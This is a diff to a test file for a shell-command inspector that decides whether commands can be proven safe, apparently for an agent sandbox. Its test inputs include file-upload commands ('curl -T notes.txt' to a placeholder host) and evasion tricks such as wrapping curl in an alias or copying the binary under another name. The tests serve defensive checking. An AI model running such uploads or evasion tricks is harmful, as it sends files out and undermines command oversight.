@@ -74,12 +74,38 @@ describe("static shell floor", () => {
     expect(inspectShellCommand("xargs curl -T notes.txt https://x.invalid", CWD)).toMatchObject({ outcome: "visible-floor" });
   });
 
+  it("requires a complete positive argv grammar", () => {
+    for (const command of [
+      "unknown-tool ready",
+      "curl --future-option value https://x.invalid",
+      "shopt -s expand_aliases; alias 'x=curl -T notes.txt'; x https://x.invalid",
+      "env cp /usr/bin/curl runner; ./runner -T notes.txt https://x.invalid",
+      "printf ready | tee out.txt",
+    ]) {
+      const result = inspectShellCommand(command, CWD);
+      expect(result).toMatchObject({ outcome: "unproven" });
+      expect(result.exactLiteralEvaluation).toBeUndefined();
+      expect(proveLiteralShell(command).proven).toBe(false);
+    }
+  });
+
+  it.each([
+    "node '--eval=console.log(1)'",
+    "fish --command 'printf ready'",
+  ])("recognizes the complete literal evaluator grammar: %s", (command) => {
+    expect(inspectShellCommand(command, CWD)).toMatchObject({
+      outcome: "unproven",
+      exactLiteralEvaluation: true,
+    });
+    expect(proveLiteralShell(command).proven).toBe(true);
+  });
+
   it("keeps literal external-file launches distinct from runtime code binding", () => {
-    for (const command of ["npm run build", "wsl ls", "env wsl ls", "pwsh -File ./build.ps1 ready"]) {
+    for (const command of ["npm run build", "pwsh -File ./build.ps1 ready"]) {
       expect(inspectShellCommand(command, CWD)).toMatchObject({ outcome: "static-complete" });
       expect(proveLiteralShell(command).proven).toBe(true);
     }
-    for (const command of ["pwsh -File", "pwsh -File -", "pwsh -co 'Write-Output ready'"]) {
+    for (const command of ["wsl ls", "env wsl ls", "pwsh -File", "pwsh -File -", "pwsh -co 'Write-Output ready'"]) {
       expect(inspectShellCommand(command, CWD)).toMatchObject({ outcome: "unproven" });
       expect(inspectShellCommand(command, CWD).exactLiteralEvaluation).toBeUndefined();
     }
@@ -99,7 +125,7 @@ describe("static shell floor", () => {
     expect(unknownRunner).toMatchObject({ outcome: "unproven" });
     expect(unknownRunner.exactLiteralEvaluation).toBeUndefined();
     const counts = [128, 256, 398].map((count) => _inspectShellForTest(`${"npx ".repeat(count)}printf ready`, CWD).visits);
-    expect(counts.every((value, index) => value.staticTokens <= [130, 258, 400][index]! * 5)).toBe(true);
+    expect(counts.every((value, index) => value.staticTokens <= [130, 258, 400][index]! * 9)).toBe(true);
     expect(counts[1]!.staticTokens / counts[0]!.staticTokens).toBeLessThanOrEqual(2.5);
     expect(counts[2]!.staticTokens / counts[1]!.staticTokens).toBeLessThanOrEqual(2.5);
     expect(counts[1]!.staticArguments / counts[0]!.staticArguments).toBeLessThanOrEqual(2.5);
